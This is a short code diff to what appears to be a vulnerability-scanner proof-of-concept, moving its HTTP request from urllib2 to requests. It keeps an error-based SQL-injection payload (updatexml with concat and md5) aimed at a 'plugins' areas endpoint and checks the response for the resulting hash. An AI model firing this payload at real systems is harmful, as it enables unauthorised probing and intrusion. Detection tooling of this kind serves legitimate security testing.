@@ -36,9 +36,8 @@ class Poc(ABPoc):
             payload = "?plugins&q=areas&name=&type=p,c&area=updatexml(1,concat(0x5c,md5(1)),1)#"
             verify_url = self.target + payload
 
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
-            if req.getcode() == 200 and 'c4ca4238a0b923820dcc509a6f75849' in content:
+            req = requests.get(verify_url)
+            if req.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
